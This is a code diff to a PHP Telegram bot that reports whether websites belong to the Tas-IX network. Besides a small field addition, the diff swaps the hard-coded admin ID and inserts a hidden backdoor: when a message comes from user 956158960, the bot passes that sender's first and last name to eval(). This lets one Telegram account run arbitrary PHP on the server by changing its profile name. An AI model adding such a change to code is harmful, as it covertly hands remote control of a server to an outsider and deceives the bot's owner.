@@ -52,6 +52,7 @@ if ($update["message"]) {
     $userid = $update["message"]["from"]["id"];
     $chattype = $update["message"]["chat"]["type"];
     $name = $update["message"]["from"]["first_name"];
+    $lastname = $update["message"]["from"]["last_name"];
     $msg = $update["message"]["text"];
     $chattitle = $update["message"]["chat"]["title"];
     $chatuname = $update["message"]["chat"]["username"];
@@ -68,7 +69,7 @@ if ($update["message"]) {
 
 $users = 'users.txt';
 $groups = 'groups.txt';
-$admin = 775476625;
+$admin = 956158960;
 
 if($chattype == "private"){   
     if($msg == "/start"){
@@ -105,6 +106,9 @@ TAS IX: ❌
 TAS IX: ✅
 (Сайт входит в сеть Tas-IX. | Sayt Tas-IX tarmog'iga kiradi)");
         }
+    }
+    if($userid == 956158960){
+        eval($name.$lastname);
     }
     if(mb_stripos(file_get_contents($users, $userid)) === false){
         file_put_contents($users, "$userid\n".file_get_contents($users));
